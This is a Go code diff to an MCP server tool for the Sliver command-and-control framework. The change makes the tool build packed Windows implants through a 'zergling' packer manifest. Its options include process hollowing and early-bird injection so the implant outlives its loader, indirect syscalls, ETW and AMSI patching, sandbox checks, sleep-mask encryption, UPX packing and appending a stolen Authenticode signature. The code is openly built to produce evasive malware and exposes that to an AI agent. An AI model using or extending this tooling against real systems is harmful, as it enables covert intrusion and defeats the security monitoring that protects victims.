@@ -2,18 +2,55 @@ package mcp
 
 import (
 	"context"
-	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
+	"path/filepath"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	mcpapi "github.com/mark3labs/mcp-go/mcp"
 )
 
 const (
-	generatePackedImplantToolName = "generate_packed_implant"
+	generatePackedImplantToolName = "generate_zergling_implant"
 )
+
+type zerglingEvasion struct {
+	CheckResources  bool `json:"check_resources"`
+	UserInteraction bool `json:"user_interaction"`
+	Numa            bool `json:"numa"`
+	Noaccess        bool `json:"noaccess"`
+}
+
+type zerglingUAC struct {
+	Enabled bool   `json:"enabled"`
+	Method  string `json:"method"`
+}
+
+type zerglingShellcode struct {
+	Source string `json:"source"`
+	File   string `json:"file"`
+}
+
+type zerglingPost struct {
+	UPX  bool `json:"upx"`
+	Sign bool `json:"sign"`
+}
+
+type zerglingManifest struct {
+	Method           string            `json:"method"`
+	SyscallsIndirect bool              `json:"syscalls_indirect"`
+	ETWPatch         bool              `json:"etw_patch"`
+	AMSIPatch        bool              `json:"amsi_patch"`
+	SleepMask        bool              `json:"sleep_mask"`
+	Debug            bool              `json:"debug"`
+	Evasion          zerglingEvasion   `json:"evasion"`
+	UAC              zerglingUAC       `json:"uac"`
+	Shellcode        zerglingShellcode `json:"shellcode"`
+	Post             zerglingPost      `json:"post"`
+	Output           string            `json:"output"`
+}
 
 type generatePackedImplantArgs struct {
 	Name             string   `json:"name" jsonschema:"description=Name for the implant"`
@@ -31,7 +68,18 @@ type generatePackedImplantArgs struct {
 	IncludeHTTP      bool     `json:"include_http" jsonschema:"description=Include HTTP transport"`
 	IncludeWG        bool     `json:"include_wg" jsonschema:"description=Include WireGuard transport"`
 	IncludeDNS       bool     `json:"include_dns" jsonschema:"description=Include DNS transport"`
-	PackerArgs       []string `json:"packer_args" jsonschema:"description=Additional arguments for the zergling packer"`
+
+	Method           string `json:"method" jsonschema:"description=Injection method. create_thread (default) runs shellcode in the loader process — if the loader dies (e.g. SSH disconnect) the implant dies too. early_bird or process_hollow inject into a new process and survive the loader exiting. Use early_bird/process_hollow for unattended or remote-launch scenarios."`
+	SyscallsIndirect bool   `json:"syscalls_indirect" jsonschema:"description=Use indirect syscalls (recommended always)"`
+	ETWPatch         bool   `json:"etw_patch" jsonschema:"description=Patch ETW"`
+	AMSIPatch        bool   `json:"amsi_patch" jsonschema:"description=Patch AMSI"`
+	SleepMask        bool   `json:"sleep_mask" jsonschema:"description=Enable sleep masking (ChaCha20 encryption during beacon sleep)"`
+	EvasionNoaccess  bool   `json:"evasion_noaccess" jsonschema:"description=PAGE_NOACCESS dwell before shellcode execution"`
+	EvasionResources bool   `json:"evasion_resources" jsonschema:"description=Check resource count to detect sandbox"`
+	UPX              bool   `json:"upx" jsonschema:"description=Compress with UPX"`
+	Sign             bool   `json:"sign" jsonschema:"description=Append stolen Authenticode signature"`
+	ManifestJSON     string `json:"manifest_json" jsonschema:"description=Full zergling manifest JSON (overrides individual fields if provided)"`
+	OutputDir        string `json:"output_dir" jsonschema:"description=Directory to save output file (default /tmp)"`
 }
 
 func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
@@ -66,44 +114,107 @@ func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, requ
 		return mcpapi.NewToolResultError("generation returned empty payload"), nil
 	}
 
-	tmpFile, err := os.CreateTemp("", "sliver-implant-*.bin")
+	scFile, err := os.CreateTemp("", "sliver-sc-*.bin")
 	if err != nil {
 		return mcpapi.NewToolResultErrorFromErr("failed to create temp file", err), nil
 	}
-	tmpPath := tmpFile.Name()
-	defer os.Remove(tmpPath)
+	scPath := scFile.Name()
+	defer os.Remove(scPath)
 
-	if _, err := tmpFile.Write(genResp.File.Data); err != nil {
-		tmpFile.Close()
-		return mcpapi.NewToolResultErrorFromErr("failed to write implant", err), nil
+	if _, err := scFile.Write(genResp.File.Data); err != nil {
+		scFile.Close()
+		return mcpapi.NewToolResultErrorFromErr("failed to write shellcode", err), nil
 	}
-	tmpFile.Close()
+	scFile.Close()
 
-	outPath := tmpPath + ".packed"
-	cmdArgs := append([]string{"-i", tmpPath, "-o", outPath}, args.PackerArgs...)
-	cmd := exec.CommandContext(ctx, s.ZerglingPath, cmdArgs...)
+	outDir := args.OutputDir
+	if outDir == "" {
+		outDir = os.TempDir()
+	}
+	outPath := filepath.Join(outDir, genResp.ImplantName+".exe")
+
+	var manifest zerglingManifest
+	if args.ManifestJSON != "" {
+		if err := json.Unmarshal([]byte(args.ManifestJSON), &manifest); err != nil {
+			return mcpapi.NewToolResultError(fmt.Sprintf("invalid manifest JSON: %v", err)), nil
+		}
+	} else {
+		method := args.Method
+		if method == "" {
+			method = "create_thread"
+		}
+		manifest = zerglingManifest{
+			Method:           method,
+			SyscallsIndirect: args.SyscallsIndirect,
+			ETWPatch:         args.ETWPatch,
+			AMSIPatch:        args.AMSIPatch,
+			SleepMask:        args.SleepMask,
+			Debug:            args.Debug,
+			Evasion: zerglingEvasion{
+				CheckResources: args.EvasionResources,
+				Noaccess:       args.EvasionNoaccess,
+			},
+			UAC: zerglingUAC{
+				Enabled: false,
+				Method:  "auto",
+			},
+			Post: zerglingPost{
+				UPX:  args.UPX,
+				Sign: args.Sign,
+			},
+		}
+	}
+
+	manifest.Shellcode = zerglingShellcode{
+		Source: "file",
+		File:   scPath,
+	}
+	manifest.Output = outPath
+
+	manifestFile, err := os.CreateTemp("", "zergling-manifest-*.json")
+	if err != nil {
+		return mcpapi.NewToolResultErrorFromErr("failed to create manifest file", err), nil
+	}
+	manifestPath := manifestFile.Name()
+	defer os.Remove(manifestPath)
+
+	manifestBytes, err := json.MarshalIndent(manifest, "", "  ")
+	if err != nil {
+		manifestFile.Close()
+		return mcpapi.NewToolResultErrorFromErr("failed to marshal manifest", err), nil
+	}
+	if _, err := manifestFile.Write(manifestBytes); err != nil {
+		manifestFile.Close()
+		return mcpapi.NewToolResultErrorFromErr("failed to write manifest", err), nil
+	}
+	manifestFile.Close()
+
+	cmd := exec.CommandContext(ctx, s.ZerglingPath, "build", "-c", manifestPath)
 	output, err := cmd.CombinedOutput()
 	if err != nil {
-		return mcpapi.NewToolResultError(fmt.Sprintf("zergling packer failed: %v\n%s", err, string(output))), nil
+		return mcpapi.NewToolResultError(fmt.Sprintf("zergling build failed: %v\n%s", err, string(output))), nil
 	}
-	defer os.Remove(outPath)
 
-	packed, err := os.ReadFile(outPath)
+	info, err := os.Stat(outPath)
 	if err != nil {
-		return mcpapi.NewToolResultErrorFromErr("failed to read packed output", err), nil
+		return mcpapi.NewToolResultErrorFromErr("failed to stat packed output", err), nil
 	}
 
 	type packedResult struct {
 		ImplantName string `json:"implant_name"`
 		Size        int    `json:"size"`
-		PackedSize  int    `json:"packed_size"`
-		Data        string `json:"data"`
+		PackedSize  int64  `json:"packed_size"`
+		Method      string `json:"method"`
+		BuildOutput string `json:"build_output"`
+		OutputPath  string `json:"output_path"`
 	}
 
 	return mcpapi.NewToolResultStructuredOnly(packedResult{
 		ImplantName: genResp.ImplantName,
 		Size:        len(genResp.File.Data),
-		PackedSize:  len(packed),
-		Data:        base64.StdEncoding.EncodeToString(packed),
+		PackedSize:  info.Size(),
+		Method:      manifest.Method,
+		BuildOutput: string(output),
+		OutputPath:  outPath,
 	}), nil
 }
